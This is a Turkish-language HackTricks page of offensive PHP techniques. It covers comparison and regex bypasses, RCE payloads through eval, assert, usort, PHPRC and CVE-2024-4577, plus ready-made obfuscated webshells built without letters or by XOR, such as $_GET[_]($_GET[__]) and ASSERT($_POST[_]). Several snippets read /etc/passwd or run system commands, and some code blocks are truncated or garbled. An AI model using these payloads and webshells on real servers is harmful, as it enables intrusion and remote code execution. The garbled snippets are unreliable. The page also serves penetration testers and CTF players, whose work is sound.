# PHP İpuçları

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**]'yi (https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**]'in (https://opensea.io/collection/the-peass-family) bulunduğu koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking ipuçlarınızı paylaşın, PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>

<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Çerezlerin yaygın konumu:

Bu aynı zamanda phpMyAdmin çerezleri için de geçerlidir.

Çerezler:
```
PHPSESSID
phpMyAdmin
```
Konumlar:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP Karşılaştırmalarını Atlatma

### Gevşek Karşılaştırmalar/Tip Dönüşümü ( == )

Eğer PHP'de `==` kullanılıyorsa, karşılaştırmanın beklenildiği gibi davranmadığı beklenmedik durumlar olabilir. Bu, "==" sadece aynı türe dönüştürülen değerleri karşılaştırır, eğer karşılaştırılan verinin türünün de aynı olduğunu karşılaştırmak istiyorsanız `===` kullanmanız gerekir.

PHP karşılaştırma tabloları: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (567).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Bir sayı ile başlamayan bir dize bir sayıya eşittir
* `"0xAAAA" == "43690" -> True` Onaltılık veya ondalık biçimdeki sayılardan oluşan dizeler, aynı sayıya/dizeye eşit olabilirler (dizedeki sayılar sayı olarak yorumlanır)
* `"0e3264578" == 0 --> True` "0e" ile başlayan ve herhangi bir şeyi takip eden bir dize 0'a eşit olacaktır
* `"0X3264578" == 0X --> True` "0" ile başlayan ve herhangi bir harfi takip eden (X herhangi bir harf olabilir) ve herhangi bir şeyi takip eden bir dize 0'a eşit olacaktır
* `"0e12334" == "0" --> True` Bu çok ilginç çünkü bazı durumlarda "0" ile başlayan ve karşılaştırılan veriye eşit olan bir dize girdisi ve karşılaştırılan içerik kontrol edebilirsiniz. Bu nedenle, "0e" ile başlayan ve herhangi bir harf içermeyen bir karmayı oluşturacak bir değer sağlayabilirseniz, karşılaştırmayı atlayabilirsiniz. Bu formatta **zaten karmalanmış dizeleri** burada bulabilirsiniz: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Bir dizideki herhangi bir harf, int 0'a eşittir

Daha fazla bilgi için [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Tip Dönüşümü**, varsayılan olarak `in_array()` işlevini de etkiler (katı bir karşılaştırma yapmak için üçüncü argümanı true olarak ayarlamanız gerekir):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Bu fonksiyon **herhangi bir kimlik doğrulama kontrolü** için kullanılıyorsa (örneğin şifre kontrolü) ve kullanıcı karşılaştırmanın bir tarafını kontrol ediyorsa, şifre değeri olarak bir dizi yerine boş bir dizi gönderebilir (`https://ornek.com/giris.php/?kullaniciadi=admin&sifre[]=`) ve bu kontrolü atlayabilir:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
### Katı tür Jonglajı

`strcasecmp()` ile aynı hata meydana gelir.

Eğer `===` kullanılıyorsa bile, karşılaştırmanın **tür jonglajına karşı savunmasız** olabileceği hatalar olabilir. Örneğin, karşılaştırma **veriyi karşılaştırmadan önce farklı bir nesne türüne dönüştürüyorsa**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** kullanıcı girişini doğrulamak için kullanılabilir (herhangi bir kelime/regex'in kullanıcı girişinde **siyah listede** olup olmadığını kontrol eder ve değilse, kod işlemini sürdürebilir).

#### Yeni satır atlatma

Ancak, regexp'in başlangıcını sınırlarken `preg_match()` sadece kullanıcı girişinin ilk satırını kontrol eder, sonra eğer bir şekilde girişi **birkaç satırda gönderebilirseniz**, bu kontrolü atlayabilirsiniz. Örnek:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Bu kontrolü atlamak için değeri **yeni satırlarla urlencoded** (`%0A`) gönderebilirsiniz veya **JSON verisi** gönderebiliyorsanız, bunu **birkaç satırda** gönderin:
```php
{
"cmd": "cat /etc/passwd"
}
```
Örnek bulabilirsiniz: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Uzunluk hatası atlatma**

(Bu atlatma, PHP 5.2.5'te denendi ve PHP 7.3.15'te çalışmadı gibi görünüyor)\
Eğer `preg_match()`'e geçerli çok **büyük bir girdi** gönderebilirseniz, **işleyemez** ve kontrolü **atlayabilirsiniz**. Örneğin, eğer bir JSON'u karalıyorsa şunu gönderebilirsiniz:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### ReDoS Atlatma

Hile kaynağı: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) ve [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Kısacası, sorun, PHP'deki `preg_*` fonksiyonlarının [PCRE kütüphanesi](http://www.pcre.org/) üzerine kurulması nedeniyle oluşur. PCRE'de belirli düzenli ifadeler, çok sayıda özyineli çağrı kullanılarak eşleştirilir, bu da çok miktarda yığın alanı tüketir. Özyineli çağrılara izin verilen miktar üzerinde bir sınır belirlemek mümkündür, ancak PHP'de bu sınır [varsayılan olarak 100.000'dir](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) ve yığın alanına sığmaktan daha fazladır.

Bu sorun hakkında daha detaylı konuşulan [bu Stackoverflow konusu](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) da gönderide paylaşıldı. Görevimiz şimdi açıktı:\
**Regex'in 100.000'den fazla özyineli çağrı yapmasını sağlayacak bir giriş göndermek, SIGSEGV'ye neden olacak ve `preg_match()` fonksiyonunu `false` döndürecek şekilde uygulamanın girişimizin kötü niyetli olmadığını düşünmesini sağlayacak, ardından payload'ın sonunda `{system(<çokkötükod>)}` gibi bir sürpriz atarak SSTI --> RCE --> bayrak :)**.

Evet, regex terimleri açısından, aslında 100k "özyineli çağrı" yapmıyoruz, ancak "geri izleme adımlarını" sayıyoruz, ki bu da [PHP belgelerinde](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) belirtildiği gibi `pcre.backtrack_limit` değişkeninde varsayılan olarak 1.000.000 (1M) olur.\
Buna ulaşmak için, `'X'*500_001` 1 milyon geri izleme adımına (500k ileri ve 500k geri) yol açacaktır:
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### PHP obfuscation için Türkçe Karakter Dizisi Dönüşümü
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Yönlendirmeden Sonra Yürüt (EAR)

Eğer PHP başka bir sayfaya yönlendiriyorsa ancak **`die`** veya **`exit`** fonksiyonu **`Location`** başlığı ayarlandıktan sonra çağrılmamışsa, PHP yürütmeye devam eder ve verileri gövdeye ekler:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Yol Traversal ve Dosya Dahil Etme Sömürüsü

Kontrol edin:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[file-inclusion](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## Daha fazla hile

* **register\_globals**: **PHP < 4.1.1.1** sürümlerinde veya yanlış yapılandırılmışsa, **register\_globals** etkin olabilir (veya davranışları taklit ediliyor olabilir). Bu, $\_GET gibi global değişkenlerde bir değer varsa örneğin $\_GET\["param"]="1234", bu değere **$param** üzerinden erişebilirsiniz. Bu nedenle, HTTP parametreleri göndererek kod içinde kullanılan değişkenleri **üzerine yazabilirsiniz**.
* **Aynı alanın PHPSESSION çerezleri aynı yerde saklanır**, bu nedenle bir alanda **farklı yollarda farklı çerezler kullanılıyorsa** bir yolun, diğer yolun çerezine erişmesini sağlayabilirsiniz. Bu şekilde, **her iki yol da aynı isimde bir değişkene erişirse**, bu değişkenin değerini yol1'den yol2'ye uygulayabilirsiniz. Ve ardından yol2, yol1'in değişkenlerini geçerli kabul eder (çerezin adını, yol2'de karşılık gelen adı vererek).
* Makinenin kullanıcı adlarını elde ettiğinizde. PHP dizinlerinin etkin olup olmadığını kontrol etmek için **/\~\<KULLANICIADİ>** adresine bakın.
* [**Php sargıları kullanarak LFI ve RCE**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Bu fonksiyonlar genellikle PHP'de **şifrelerden hashler oluşturmak** ve bir şifrenin bir hash ile karşılaştırıldığında doğru olup olmadığını **kontrol etmek** için kullanılır. Desteklenen algoritmalar: `PASSWORD_DEFAULT` ve `PASSWORD_BCRYPT` (başlangıcı `$2y$`). **PASSWORD\_DEFAULT'ın genellikle PASSWORD\_BCRYPT ile aynı olduğunu** unutmayın. Ve şu anda, **PASSWORD\_BCRYPT'ın 72 bayt giriş boyutunda bir sınırlaması** vardır. Bu nedenle, bu algoritmayla 72 bayttan büyük bir şeyi hashlemeye çalıştığınızda sadece ilk 72B kullanılacaktır:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP başlıklarını atlatarak PHP hatalarını istismar etme

#### Başlıklar ayarlandıktan sonra hata oluşturma

[**Bu twitter konuşmasından**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A\&s=19) görebileceğiniz gibi 1000'den fazla GET parametresi veya 1000 POST parametresi veya 20 dosya gönderildiğinde, PHP'nin yanıtta başlıkları ayarlamayacağı.

Örneğin, CSP başlıklarının ayarlandığı kodlarda atlatmaya izin verme:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### Başlıklar ayarlanmadan önce bir gövde doldurma

Eğer bir **PHP sayfası hataları yazdırıyor ve kullanıcı tarafından sağlanan bazı girdileri ekrana yazdırıyorsa**, kullanıcı PHP sunucusunun geri **uzun bir içerik** yazdırmasını sağlayabilir, böylece yanıtı **başlıkları eklemeye çalıştığında sunucu bir hata fırlatacaktır**.\
Aşağıdaki senaryoda **saldırgan sunucunun büyük hatalar fırlatmasını sağladı**, ve ekran görüntüsünde görebileceğiniz gibi PHP **başlık bilgilerini değiştirmeye çalıştığında** (örneğin CSP başlığı kullanıcıya gönderilmedi):

![](<../../../.gitbook/assets/image (1085).png>)

## PHP fonksiyonlarında SSRF

Sayfayı kontrol et:

{% content-ref url="php-ssrf.md" %}
[php-ssrf.md](php-ssrf.md)
{% endcontent-ref %}

## Kod yürütme

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Daha fazla faydalı PHP fonksiyonu için buraya bakın](php-useful-functions-disable\_functions-open\_basedir-bypass/)

### **preg\_replace()** aracılığıyla RCE
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
"replace" argümanındaki kodu yürütmek için en az bir eşleşme gereklidir. Bu preg\_replace seçeneği **PHP 5.5.0'den itibaren kullanımdan kaldırılmıştır.**

### **Eval() Aracılığıyla Uzaktan Kod Çalıştırma (RCE)**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **Assert() ile RCE**

Bu php içindeki fonksiyon, bir dize içinde yazılmış kodu **çalıştırmanıza** olanak tanır ve buna bağlı olarak **true veya false döndürür** (ve buna bağlı olarak yürütümü değiştirir). Genellikle kullanıcı değişkeni bir dizenin ortasına yerleştirilir. Örneğin:\
`assert("strpos($_GET['page']),'..') === false")` --> Bu durumda **RCE** elde etmek için şunu yapabilirsiniz:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
### **usort() ile Uzaktan Kod Çalıştırma (RCE)**

Bu fonksiyon, belirli bir işlevi kullanarak öğelerin bir dizisini sıralamak için kullanılır.\
Bu fonksiyonu kötüye kullanmak için:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
**Kapanış parantezlerini kaç tane kapatmanız gerektiğini keşfetmek için:**

- `?order=id;}//`: Bir hata mesajı alırız (`Parse error: syntax error, unexpected ';'`). Muhtemelen bir veya daha fazla parantez eksik.
- `?order=id);}//`: Bir **uyarı** alırız. Bu doğru gibi görünüyor.
- `?order=id));}//`: Bir hata mesajı alırız (`Parse error: syntax error, unexpected ')' i`). Muhtemelen fazla kapanış parantezi var.

### **.httaccess Üzerinden RCE**

Eğer bir **.htaccess** dosyası **yükleyebilirseniz**, çeşitli ayarlamalar yapabilir ve hatta kodları çalıştırabilirsiniz (bu dosyaların uzantısı .htaccess olan dosyaların **çalıştırılabilir** olabileceğini yapılandırabilirsiniz).

Farklı .htaccess kabuklarına [buradan](https://github.com/wireghoul/htshells) ulaşabilirsiniz.

### Env Değişkenleri Üzerinden RCE

Eğer **PHP'de env değişkenlerini değiştirmenize izin veren bir zayıflık bulursanız** (ve başka bir dosya yükleme zayıflığı da bulursanız, daha fazla araştırma ile bunun atlatılabileceği belki), bu davranışı **RCE** elde etmek için kötüye kullanabilirsiniz.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Bu env değişkeni, diğer ikili dosyaları çalıştırırken keyfi kütüphaneleri yüklemenize izin verir (ancak bu durumda çalışmayabilir).
* **`PHPRC`** : PHP'ye **yapılandırma dosyasını nerede bulacağını söyler**, genellikle `php.ini` olarak adlandırılır. Kendi yapılandırma dosyanızı yükleyebiliyorsanız, o zaman, PHP'yi ona işaret etmek için `PHPRC`'yi kullanın. İkinci yüklenen bir dosyayı belirten **`auto_prepend_file`** girdisi ekleyin. Bu ikinci dosya, normal **PHP kodunu içerir ve ardından PHP çalışma zamanı tarafından diğer tüm kodlardan önce çalıştırılır**.
1. Kabuk kodumuzu içeren bir PHP dosyası yükleyin
2. İkinci bir dosya yükleyin, adımla yüklediğimiz dosyayı çalıştırmak için PHP ön işleyicisine talimat veren bir **`auto_prepend_file`** yönergesi içerir
3. `PHPRC` değişkenini adım 2'de yüklediğimiz dosyaya ayarlayın.
* Bu zinciri nasıl çalıştıracağınız hakkında daha fazla bilgi edinin [**orijinal rapordan**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - başka bir seçenek
* Eğer **dosya yükleyemiyorsanız**, FreeBSD'de "file" `/dev/fd/0`'ı kullanabilirsiniz, bu **`stdin`** içeren bir **`stdin`'e gönderilen isteğin gövdesi**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Veya RCE elde etmek için **`allow_url_include`**'ı etkinleştirin ve bir dosyaya **base64 PHP kodu** ile başlayın:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Teknik [**bu rapordan**](https://vulncheck.com/blog/juniper-cve-2023-36845) alınmıştır.

### XAMPP CGI RCE - CVE-2024-4577

Web sunucusu HTTP isteklerini ayrıştırır ve bir PHP betiğine ileterek bir isteği şu şekilde yürütür: [`http://host/cgi.php?foo=bar`](http://host/cgi.php?foo=bar\&ref=labs.watchtowr.com) gibi, `php.exe cgi.php foo=bar`, bu da bir parametre enjeksiyonuna izin verir. Bu, gövdeden PHP kodunu yüklemek için aşağıdaki parametreleri enjekte etmeyi mümkün kılar:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
Ayrıca, PHP'nin sonradan normalleştirilmesi nedeniyle "-" parametresine 0xAD karakterini enjekte etmek mümkündür. [**bu gönderiden**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/) exploit örneğini kontrol edin.
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## PHP Statik analiz

[Buradan](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be) bu fonksiyonlara kod ekleyip ekleyemeyeceğinizi kontrol edin:
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Eğer bir PHP uygulamasını hata ayıklıyorsanız, `/etc/php5/apache2/php.ini` dosyasına `display_errors = On` ekleyerek hata yazdırmayı global olarak etkinleştirebilir ve apache'yi yeniden başlatabilirsiniz: `sudo systemctl restart apache2`

### PHP Kodunu Deobfuscate Etme

PHP kodunu deobfuscate etmek için **web**[ **www.unphp.net**](http://www.unphp.net) **kullanabilirsiniz.**

## PHP Wrappers ve Protokoller

PHP Wrappers ve protokoller, bir sistemin yazma ve okuma korumalarını **atlaymanıza** ve onu tehlikeye atmanıza olanak tanıyabilir. [**Daha fazla bilgi için bu sayfaya bakın**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug kimlik doğrulamasız RCE

Eğer bir `phpconfig()` çıktısında **Xdebug**'in **etkin** olduğunu görürseniz, [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit) üzerinden RCE almaya çalışmalısınız.

## Değişken değişkenleri
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## Yeni $\_GET\["a"]\($\_GET\["b"] ile kötüye kullanılan RCE

Eğer bir sayfada **herhangi bir sınıfın yeni bir nesnesini oluşturabiliyorsanız**, RCE elde edebilirsiniz, nasıl yapılacağını öğrenmek için aşağıdaki sayfayı kontrol edin:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Harfler olmadan PHP çalıştırma

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Sekizliği kullanarak
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR (Exclusive OR) işlemi, iki bit arasında gerçekleştirilen bir mantıksal işlemdir. XOR işlemi, yalnızca giriş bitlerinden biri 1 ise 1 çıktısı verir. Aksi durumda çıktı 0 olur. Bu işlem, veri şifreleme ve karşılaştırma gibi birçok alanda kullanılır.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR basit kabuk kodu

[**Bu yazıda**](https://mgp25.com/ctf/Web-challenge/) belirtildiğine göre, aşağıdaki şekilde basit bir kabuk kodu oluşturmak mümkündür:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Yani, eğer **sayı ve harf olmadan keyfi PHP kodu çalıştırabiliyorsanız**, aşağıdaki gibi bir istek gönderebilir ve keyfi PHP kodunu çalıştırmak için bu yükü kötüye kullanabilirsiniz:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Daha detaylı bir açıklama için [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (eval içinde)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl gibi
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
